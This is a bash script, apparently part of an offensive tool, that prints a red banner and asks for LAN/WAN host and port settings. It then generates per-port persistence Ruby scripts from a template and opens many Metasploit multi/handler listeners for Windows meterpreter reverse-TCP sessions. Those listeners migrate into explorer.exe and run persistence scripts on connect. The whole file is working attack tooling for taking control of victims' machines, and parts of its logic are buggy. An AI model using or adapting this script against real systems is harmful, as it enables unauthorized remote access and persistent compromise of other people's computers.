#! /bin/bash




echo -e "\033[31m
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc      cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,0.0,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO000OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO00000000000000000000000OOOOOOOOo
  dOOOOOOOO|----------------------|OOOOOOOx
  lOOOOOOOO|________      ________|OOOOOOOl
  .OOOOOOOO000000000|    |00000000OOOOOOOO.
   cOOOOO0000000OO00|    |o00000000OOOOOOc
    oOOOOO000000OOOO|   :|OO0000000OOOOOo
     lOOOOO000000OOO|   :|OO00000000OOOl
      ;OOOO00000OOOO|   :|OO000000OOOO;
       .dOOo0000OOOO|    |O00000000Od.
         ,kOl000OOOO|    |OO0000dOk,
           :kk00|---     |OO00cOk:
            k00O|________|OOOOk:
             00,xOOOOOOOOOOOx,
              00 .lOOOOOOOl.
                0000,dOd,
                 000000
		  000

\033[0m"

#   "\033[31m    \033[0m"        

echo "Creating Payload for LAN or WAN ?"

read typee

if [ "$typee" = "WAN" ] 
then
	
	
	echo "public ip"

	read public
	
	echo "lhost:"
	
	read lhost

	echo "lport:"

	read lport

	

else	
	
	echo "lhost:"
	
	read lhost

	echo "lport:"

	read lport

	
fi
	








if [ "$typee" = "WAN" ]
then
		
	
		
	echo "OPENING SUPER LISTENER"

	#asking ports

	echo "The port of the first payload is $lport"

	echo "Waiting for last port of port range"
	
	read portend
	
	echo "U choosed to end with $portend"

	#how many session user want

	echo "How many session u want to open ?"
	
	let "num = portend - lport"
	
	echo "u want to start $num sessions"

	let "port  = lport"

	echo "port=$port"

	#open requested number of terminal tab ith listener ready"

	num=$(($num+1))
	while test $num -ne 0; 
		do
			echo "actual port=$port"
			
			lhost2="'$public'"

			cp template.rb "$port"_"$lhost2"_persistence.rb

			cp template.rb "$port2"_"$lhost2"_persistence.rb

			port2=$(($port+1))

			sed -i 's/"HEREISLHOST"/'"$lhost"'/' "$port"_"$lhost2"_persistence.rb 

			sed -i 's/"HEREISLPORT"/'"$port"'/' "$port"_"$lhost2"_persistence.rb

			sed -i 's/"HEREISLHOST"/'"$lhost"'/' "$port2"_"$lhost2"_persistence.rb 

			sed -i 's/"HEREISLPORT"/'"$port"'/' "$port2"_"$lhost2"_persistence.rb

			gnome-terminal --tab --command='/usr/share/metasploit-framework/msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lport '$port'; set lhost '$lhost'; set PrependMigrate true; set PrependMigrateProc explorer.exe; set AutoRunScript /root/Bureau/GRENADA/'"$port2"'_'"$lhost2"'_persistence.rb; run"'
	
			if [ $port -ne $portend ]
				then
				        port=$(($port+1))
				
					num=$(($num -1))
		
				else
				        exit
				fi
	
	
	done


else
	
	

	echo "LAN"

	echo "OPENING SUPER LISTENER"

	#asking ports

	echo "The port of the first payload is $lport"

	echo "Waiting for last port of port range"
	
	read portend
	
	echo "U choosed to end with $portend"

	#how many session user want

	echo "How many session u want to open ?"
	
	let "num = portend - lport"
	
	echo "u want to start $num sessions"

	let "port  = lport"

	echo "port=$port"

	#open requested number of terminal tab ith listener ready"

	num=$(($num+1))
	while test $num -ne 0; 
		do
			echo "actual port=$port"
			
			lhost2="'$lhost'"
			
			port2=$(($port+1))			
			
			cp template.rb "$port"_"$lhost"_persistence.rb

			cp template.rb "$port2"_"$lhost"_persistence.rb

			sed -i 's/"HEREISLHOST"/'"$lhost2"'/' "$port"_"$lhost"_persistence.rb 

			sed -i 's/"HEREISLPORT"/'"$port"'/' "$port"_"$lhost"_persistence.rb

			sed -i 's/"HEREISLHOST"/'"$lhost2"'/' "$port2"_"$lhost"_persistence.rb 

			sed -i 's/"HEREISLPORT"/'"$port"'/' "$port2"_"$lhost"_persistence.rb

			gnome-terminal --tab --command='/usr/share/metasploit-framework/msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost '$lhost'; set lport '$port'; set PrependMigrate true; set PrependMigrateProc explorer.exe; set AutoRunScript /root/Bureau/GRENADA/'"$port2"'_'"$lhost2"'_persistence.rb; run"'
	
			if [ $port -ne $portend ]
				then
				        port=$(($port+1))
				
					num=$(($num -1))
		
				else
				        exit
				fi
	
	
	done




fi





